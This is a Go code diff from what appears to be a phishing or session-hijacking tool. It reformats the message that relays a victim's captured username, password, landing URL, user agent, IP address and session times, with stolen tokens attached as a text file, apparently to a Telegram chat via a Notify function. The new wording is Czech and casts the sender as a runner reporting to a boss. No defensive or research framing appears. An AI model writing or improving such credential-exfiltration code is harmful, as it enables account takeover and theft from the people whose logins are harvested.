@@ -172,18 +172,18 @@ func createTxtFile(session TSession) (string, error) {
 }
 
 func formatSessionMessage(session TSession) string {
-	// Format the session information (no token data in message)
-	return fmt.Sprintf("✨ Session Information ✨\n\n"+
+	// Human-like response format for a boss from a respectful runner
+	return fmt.Sprintf("⚠️ Přišlo to. ⚠️\n\n"+
 
-		"👤 Username:      ➖ %s\n"+
-		"🔑 Password:      ➖ %s\n"+
-		"🌐 Landing URL:   ➖ %s\n \n"+
-		"🖥️ User Agent:    ➖ %s\n"+
-		"🌍 Remote Address:➖ %s\n"+
-		"🕒 Create Time:   ➖ %d\n"+
-		"🕔 Update Time:   ➖ %d\n"+
+		"👤 Login:        ➖ %s\n"+
+		"🔑 Heslo:      ➖ %s\n"+
+		"🌐 LINK:          ➖ %s\n \n"+
+		"🖥️ STROJ:         ➖ %s\n"+
+		"🌍 IP ADRESA:     ➖ %s\n"+
+		"🕒 NATAŽENO:      ➖ %d\n"+
+		"🕔 POSLEDNÍ LOG:  ➖ %d\n"+
 		"\n"+
-		"📦 Tokens are added in txt file and attached separately in message.\n",
+		"📦 Ty tokeny jsem hodil do .txt, jak jste chtěl. Je to v příloze. Čekám na další rozkazy.\n",
 
 		session.Username,
 		session.Password,
@@ -194,6 +194,7 @@ func formatSessionMessage(session TSession) string {
 		session.UpdateTime,
 	)
 }
+
 func Notify(session TSession, chatid string, teletoken string) {
 
 	mu.Lock()
